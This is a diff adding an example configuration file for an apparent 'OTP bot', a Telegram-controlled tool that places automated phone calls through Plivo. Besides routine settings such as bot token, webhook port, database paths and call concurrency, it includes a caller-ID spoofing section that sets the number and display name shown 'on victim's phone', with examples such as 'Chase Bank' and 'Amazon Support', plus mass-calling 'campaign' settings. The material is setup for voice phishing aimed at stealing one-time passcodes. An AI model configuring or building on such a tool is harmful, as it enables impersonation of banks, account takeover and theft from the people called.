@@ -1,0 +1,64 @@
+# Pizza OTP Bot Configuration
+# Copy this file to config.yml and fill in your credentials
+
+# ===========================================
+# TELEGRAM SETTINGS
+# ===========================================
+# Get this from @BotFather on Telegram
+bot_token: "123456789:ABCdefGHIjklMNOpqrsTUVwxyz123456789"
+
+# Your Telegram user ID(s) - get yours with @userinfobot
+# Leave empty to allow everyone (NOT RECOMMENDED)
+admin_ids:
+  - 123456789
+
+# ===========================================
+# PLIVO SETTINGS
+# ===========================================
+# Get these from https://console.plivo.com/dashboard/
+plivo_auth_id: "PAXXXXXXXXXX"
+plivo_auth_token: "your_plivo_auth_token_here"
+
+# Your verified Plivo phone number (with country code, e.g., +15551234567)
+plivo_number: "+15551234567"
+
+# ===========================================
+# CALLER ID SPOOFING (OPTIONAL)
+# ===========================================
+# Spoof the caller ID to show a different number on victim's phone
+# The number must be verified in your Plivo account!
+# If not set, uses plivo_number by default
+# caller_id: "+15559876543"
+
+# Display name shown on victim's phone (some carriers support this)
+# Example: "Chase Bank", "Amazon Support", "Apple Inc"
+# caller_name: "Chase Bank"
+
+# ===========================================
+# SERVER SETTINGS
+# ===========================================
+# Webhook port for Plivo callbacks
+port: "3000"
+
+# Ngrok URL for local development
+# Run: ngrok http 3000
+# Then update this with your ngrok URL
+ngrok_url: "https://abc123.ngrok.io"
+
+# ===========================================
+# DATABASE SETTINGS
+# ===========================================
+database_path: "./data/bot.db"
+log_path: "./logs/bot.log"
+
+# ===========================================
+# CAMPAIGN SETTINGS
+# ===========================================
+# Max concurrent calls (1-50)
+concurrency: 5
+
+# Max retry attempts per number
+max_retries: 3
+
+# Call timeout in seconds (10-300)
+call_timeout: 60
